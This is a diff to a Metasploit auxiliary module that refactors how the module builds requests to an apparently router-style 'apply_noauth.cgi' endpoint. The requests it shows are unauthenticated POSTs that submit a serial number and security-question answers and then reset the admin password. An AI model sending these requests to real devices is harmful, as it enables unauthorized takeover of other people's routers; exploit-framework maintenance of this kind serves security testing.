@@ -98,7 +98,8 @@ class MetasploitModule < Msf::Auxiliary
 
     # 1: send serial number
     send_request_cgi({
-      'uri'     => '/apply_noauth.cgi?/unauth.cgi',
+      'uri'     => '/apply_noauth.cgi',
+      'query'   => '/unauth.cgi',
       'method'  => 'POST',
       'Content-Type' => 'application/x-www-form-urlencoded',
       'vars_post' =>
@@ -111,7 +112,8 @@ class MetasploitModule < Msf::Auxiliary
 
     # 2: send answer to secret questions
     send_request_cgi({
-      'uri'     => '/apply_noauth.cgi?/securityquestions.cgi',
+      'uri'     => '/apply_noauth.cgi',
+      'query'   => '/securityquestions.cgi',
       'method'  => 'POST',
       'Content-Type' => 'application/x-www-form-urlencoded',
       'vars_post' =>
@@ -176,11 +178,12 @@ class MetasploitModule < Msf::Auxiliary
 
   def send_req(timestamp)
     begin
-      uri_str = (timestamp == nil ? \
-        "/apply_noauth.cgi?/PWD_password.htm" : \
-        "/apply_noauth.cgi?/PWD_password.htm%20timestamp=#{timestamp.to_s}")
+      query_str = (timestamp == nil ? \
+        '/PWD_password.htm' : \
+        "/PWD_password.htm%20timestamp=#{timestamp.to_s}")
       res = send_request_raw({
-          'uri'     => uri_str,
+          'uri'     => '/apply_noauth.cgi',
+          'query'   => query_str,
           'method'  => 'POST',
           'headers' => { 'Content-Type' => 'application/x-www-form-urlencoded' },
           'data'    => "submit_flag=passwd&hidden_enable_recovery=1&Apply=Apply&sysOldPasswd=&sysNewPasswd=&sysConfirmPasswd=&enable_recovery=on&question1=1&answer1=#{@q1}&question2=2&answer2=#{@q2}"
